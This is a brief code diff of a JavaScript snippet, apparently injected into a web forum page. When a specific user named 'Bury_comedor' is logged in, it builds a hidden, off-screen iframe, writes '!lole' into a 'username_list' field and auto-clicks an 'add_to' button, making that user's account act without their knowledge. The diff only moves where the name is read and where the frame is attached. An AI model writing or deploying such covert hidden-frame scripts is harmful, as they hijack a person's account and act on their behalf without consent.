@@ -1,6 +1,6 @@
 // var script_ids = ["a1", "a2", "a3", "a4"];
 var header = document.getElementById('header');
-var user_name = iframe.contentWindow.document.getElementsByClassName("ptop2 pleft1")[0].children[0].innerHTML;
+var user_name = document.getElementsByClassName("ptop2 pleft1")[0].children[0].innerHTML;
 if (user_name === "Bury_comedor") {
     var iframe = document.createElement('iframe');
     iframe.id = "del1me";
@@ -11,7 +11,7 @@ if (user_name === "Bury_comedor") {
     iframe.style.position = "absolute";
     iframe.style.zIndex = -1;
     iframe.style.top = "-30px";
-    document.body.append(iframe);
+    header.append(iframe);
     document.getElementById("del1me");
     iframe.contentWindow.document.getElementById("username_list").value = "!lole";
     iframe.contentWindow.document.getElementsByName("add_to")[0].click();
